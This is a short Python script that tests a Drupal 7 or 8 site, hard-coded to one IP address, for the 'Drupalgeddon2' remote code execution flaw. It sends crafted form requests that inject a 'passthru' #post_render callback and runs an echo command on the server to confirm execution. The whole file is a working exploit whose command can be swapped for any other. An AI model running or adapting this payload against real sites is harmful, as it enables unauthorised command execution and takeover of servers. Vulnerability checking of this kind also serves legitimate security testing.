import requests
import re
import bb01_ultilities as ulti

def isFormValid(host,version):
	form_id = 'user/password'  if version[:1]=='7' else 'user/register'
	urlq = host + '?q=' +form_id
	url  = host +form_id

	if (ulti.isURLValid(urlq) or ulti.isURLValid(url)):
		return True

	return False

def isPwnAble(host,version):
	signature = ulti.genSignature()
	version = version[:1]
	if version == '7':
		get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#type]':'markup', 'name[#markup]': ' echo ' + signature}
		post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
		r = requests.post(host, data=post_params, params=get_params, verify=False)
		m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)"', r.text)
		if m:
			found = m.group(1)
			get_params = {'q':'file/ajax/name/#value/' + found}
			post_params = {'form_build_id':found}
			res = requests.post(host, data=post_params, params=get_params)
			detect = re.search(signature, res.text)
			if detect:
				return True
		else: 
			return False
	if version == '8':
		host =  host + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
		post_params = { 'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[a][#post_render][]': 'passthru',
		'mail[a][#type]': 'markup', 'mail[a][#markup]': ' echo ' + signature }
		r = requests.post(host, data=post_params, verify=False)
		m = re.search(signature , r.text)
		if m :
			return True
		else :	
			return False

def isVuln(host, version):
	print 'Form Valid: ' , isFormValid(host,version)
	if isFormValid(host,version) == False:
		return False

	if isPwnAble(host,version) == False:
		return False

	return True


host = 'http://68.183.237.96:2307'
version ='7.44'
print 'Testing: ', host
print '=' * 25
try:
	if isVuln(host,version):
		print " This site is vulnerable"
	else:	
		print " This site is invulnerable"
except:
	pass
